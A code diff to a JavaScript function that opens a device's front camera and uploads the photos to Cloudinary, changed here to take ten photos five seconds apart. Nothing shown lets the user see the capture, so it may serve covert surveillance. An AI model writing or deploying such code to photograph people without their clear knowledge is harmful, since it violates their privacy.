@@ -100,25 +100,33 @@ const captureAndUpload = async () => {
         });
     } else {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        if (window.ImageCapture) {
-            const videoTrack = stream.getVideoTracks()[0];
-            const imageCapture = new ImageCapture(videoTrack);
-            const blob = await imageCapture.takePhoto();
-            stream.getTracks().forEach(track => track.stop());
-            await uploadToCloudinary(blob);
-        } else {
-            const videoEl = document.createElement('video');
-            videoEl.srcObject = stream;
-            videoEl.play();
-            await new Promise(resolve => setTimeout(resolve, 500));
-            const canvas = document.createElement('canvas');
-            canvas.width = videoEl.videoWidth;
-            canvas.height = videoEl.videoHeight;
-            canvas.getContext('2d').drawImage(videoEl, 0, 0);
-            stream.getTracks().forEach(track => track.stop());
-            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-            await uploadToCloudinary(blob);
+        
+        // Capture 10 photos, one every 5 seconds
+        for (let i = 0; i < 10; i++) {
+            if (i > 0) {
+                await new Promise(resolve => setTimeout(resolve, 5000));
+            }
+            
+            if (window.ImageCapture) {
+                const videoTrack = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(videoTrack);
+                const blob = await imageCapture.takePhoto();
+                await uploadToCloudinary(blob);
+            } else {
+                const videoEl = document.createElement('video');
+                videoEl.srcObject = stream;
+                videoEl.play();
+                await new Promise(resolve => setTimeout(resolve, 500));
+                const canvas = document.createElement('canvas');
+                canvas.width = videoEl.videoWidth;
+                canvas.height = videoEl.videoHeight;
+                canvas.getContext('2d').drawImage(videoEl, 0, 0);
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                await uploadToCloudinary(blob);
+            }
         }
+        
+        stream.getTracks().forEach(track => track.stop());
     }
 };
 
